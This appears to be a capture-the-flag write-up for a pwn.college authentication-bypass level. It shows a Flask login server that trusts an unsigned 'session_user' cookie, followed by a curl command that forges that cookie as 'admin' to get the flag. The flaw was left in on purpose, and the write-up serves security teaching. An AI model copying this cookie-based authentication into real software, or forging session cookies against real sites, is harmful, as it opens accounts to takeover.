This is similar to the 1st authentication bypass level, but the `session_user` value is in the cookie instead.

```python
#!/opt/pwn.college/python

import tempfile
import sqlite3
import flask
import os

app = flask.Flask(__name__)

class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result

db = TemporaryDB()

# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [os.urandom(8)])

# https://www.sqlite.org/lang_insert.html
db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")

@app.route("/", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("username")
    password = flask.request.form.get("password")

    if not username:
        flask.abort(400, "Missing `username` form parameter")
    if not password:
        flask.abort(400, "Missing `password` form parameter")

    # https://www.sqlite.org/lang_select.html
    user = db.execute("SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()

    if not user:
        flask.abort(403, "Invalid username or password")

    response = flask.redirect(flask.request.path)
    response.set_cookie('session_user', username)

    return response

@app.route("/", methods=["GET"])
def challenge_get():
    if not (username := flask.request.cookies.get("session_user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"
        if username == "admin":
            page += "<br>Here is your flag: " + open("/flag").read()

    return page + """
        <hr>
        <form method=post>
        User:<input type=text name=username>Pass:<input type=text name=password><input type=submit value=Submit>
        </form>
        </body></html>
    """

app.secret_key = os.urandom(8)
app.config['SERVER_NAME'] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

Since the parameter to check for the server is now stored in the cookie, we can just send a request with a changed cookie to get the flag:

```bash
curl -v "http://challenge.localhost:80" --cookie "session_user=admin"
```